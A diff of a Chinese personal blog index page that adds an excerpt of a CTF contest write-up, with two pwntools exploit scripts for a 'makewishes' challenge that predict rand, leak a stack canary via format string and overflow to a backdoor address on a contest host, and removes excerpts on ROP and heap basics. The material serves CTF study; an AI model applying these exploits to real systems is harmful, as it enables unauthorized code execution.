@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">7</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">6</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -136,7 +136,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">9</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -189,6 +189,102 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/25/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="fan fan">
+      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fanfan's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/25/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">比赛记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-05-25 13:29:19 / 修改时间：15:50:17" itemprop="dateCreated datePublished" datetime="2023-05-25T13:29:19+08:00">2023-05-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/05/25/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/05/25/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="cc"><a href="#cc" class="headerlink" title="**cc"></a>**cc</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="三个愿望"><a href="#三个愿望" class="headerlink" title="三个愿望"></a>三个愿望</h3><p>这道题考点在于使用ctypes库通过libc(链接的函数库)模仿程序的随机数来交互，但后期发现这是伪随机数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&#x27;./makewishes&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#print(&#x27;pid=&#x27;+str(proc.pidof(r)))</span></span><br><span class="line">r=remote(<span class="string">&quot;59.110.164.72&quot;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#加载链接库</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;wish\n&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">22</span>)</span><br><span class="line">num=<span class="built_in">str</span>(libc.rand() % <span class="number">9</span> + <span class="number">1</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;number!\n&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#canary</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;wish!\n&quot;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(r.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pwn</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;number!\n&quot;</span>,num)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)</span><br><span class="line">payload+=p64(canary)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x4011f5</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;wish!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>因为是伪随机数，用下面的也可以</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io= remote(<span class="string">&#x27;59.110.164.72&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./makewishes&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./makewishes&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;wish\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">22</span><span class="comment">#覆盖seed为零 </span></span><br><span class="line"><span class="comment">#payload= b&#x27;a&#x27;*6+b&#x27;\x00&#x27;*7+b&#x27;1&#x27;+p64(0)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a number!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;wish!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;number!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;make your final wish!\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(canary)+p64(<span class="number">0</span>)+p64(<span class="number">0x4011D6</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>同样两种方法</p>
+<p><strong>第一种</strong></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/05/25/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -332,7 +428,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-24 16:34:15" itemprop="dateModified" datetime="2023-05-24T16:34:15+08:00">2023-05-24</time>
+                <time title="修改时间：2023-06-05 14:44:38" itemprop="dateModified" datetime="2023-06-05T14:44:38+08:00">2023-06-05</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -387,105 +483,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/05/05/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/20/%E6%A0%88%E5%A4%8D%E4%B9%A0%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="fan fan">
-      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="fanfan's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/20/%E6%A0%88%E5%A4%8D%E4%B9%A0%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">栈复习与深度学习</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-04-20 18:41:21" itemprop="dateCreated datePublished" datetime="2023-04-20T18:41:21+08:00">2023-04-20</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-17 16:24:19" itemprop="dateModified" datetime="2023-05-17T16:24:19+08:00">2023-05-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">二进制基础笔记</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2023/04/20/%E6%A0%88%E5%A4%8D%E4%B9%A0%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2023/04/20/%E6%A0%88%E5%A4%8D%E4%B9%A0%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>前言：</strong>最近开始学堆了，但是栈方面只掌握一些的简单的rop利用，之所以写这个文章就是想着先进行复习再继续学习栈的高级利用方式（堆学习也不会落下），前面可能写的比较简单，后面的高级利用会进行详写。（文章学习来自Wiki）</p>
-<h1 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h1><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>栈是一种先进后出的数据结构，操作主要有压栈(push)和出栈(pop),汇编语言运行时，会充分利用栈，每个程序运行时都有虚拟地址空间，其中一部分就是该程序对应的栈，保存函数调用信息和局部变量。程序的栈从进程地址空间的高地址向低地址增长的。</p>
-<h3 id="基本rop"><a href="#基本rop" class="headerlink" title="基本rop"></a>基本rop</h3><p>nx保护开启会使栈上或堆上注入代码的方式难以发挥攻击的效果，所以我们需要用ROP来绕过保护，主要思想为在栈缓冲区溢出的基础上，利用程序已有的小片段来改变寄存器或者变量的值，控制程序的执行流程，gadget主要以ret来结尾的指令序列，ret改变了程序的执行顺序。</p>
-<h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>控制程序执行程序本身已有的代码(.text)。找到漏洞函数和后门函数的地址，控制程序返回后门函数就可以getshell了，确定我们能够控制的内存的起始地址距离main函数的返回地址的字节数进行覆盖</p>
-<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>控制程序执行shellcode代码，shellcode是用于完成某个功能的汇编代码，常用于获取目标系统的shell，shellcode需要我们自己来填充，填充的区域需要具有可执行权限。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/04/20/%E6%A0%88%E5%A4%8D%E4%B9%A0%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -813,110 +810,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/04/10/pwn%E5%A0%86%E9%A2%98%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="fan fan">
-      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="fanfan's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">堆学习</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-03-14 20:03:34" itemprop="dateCreated datePublished" datetime="2023-03-14T20:03:34+08:00">2023-03-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-17 16:21:32" itemprop="dateModified" datetime="2023-05-17T16:21:32+08:00">2023-05-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">二进制基础笔记</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>前言：栈草草的结束了，只掌握一些简单的rop利用，至于为什么这么早想学习堆，可能跟我的学习理念有关吧，我的学习理念是了解重要的学习框架，先将基础结构的相对简单的内容学会，再同步深入学习更深度的内容。现在相比较学习栈的其他花里胡哨的利用方式，我更想先学习堆的基本内容和简单利用</strong></p>
-<h1 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h1><p>堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。</p>
-<p> <strong>堆的生长方向是从低地址向高地址生长的，而栈是从高地址向低地址生长的。</strong></p>
-<p>实际上堆可以申请到的内存空间比栈要大很多，在 linux 的 4G 的虚拟内存空间里最高可以达到 2.9 G 的空间</p>
-<blockquote>
-<p>对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p>
-</blockquote>
-<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-15%20120910.png"></p>
-<p>俺以 <strong>glibc 库下的 ptmalloc2 堆管理器</strong>为例学习</p>
-<h2 id="堆的基本结构"><a href="#堆的基本结构" class="headerlink" title="堆的基本结构"></a>堆的基本结构</h2><p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-15%20142218.png"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1310,7 +1203,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1323,7 +1216,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
